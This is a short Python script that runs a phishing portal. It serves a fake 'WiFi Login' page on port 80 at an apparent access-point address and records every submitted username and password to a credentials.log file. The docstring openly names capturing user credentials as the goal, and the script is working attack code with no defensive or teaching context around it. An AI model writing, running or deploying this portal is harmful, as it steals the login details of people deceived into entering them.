import socket

def start_phishing_portal():
    """
    Start a phishing portal to capture user credentials.
    """
    html_page = """\
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h1>WiFi Login</h1>
    <form action="/submit" method="post">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Submit">
    </form>
</body>
</html>
"""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 80))
    server_socket.listen(1)

    print("Phishing portal running at http://192.168.4.1")
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address}")
        request = client_socket.recv(1024).decode()
        print(f"Request: {request}")

        if "POST /submit" in request:
            data = request.split("\r\n\r\n")[-1]
            print(f"Captured credentials: {data}")
            with open("credentials.log", "a") as log_file:
                log_file.write(f"{data}\n")

        client_socket.send(html_page.encode())
        client_socket.close()
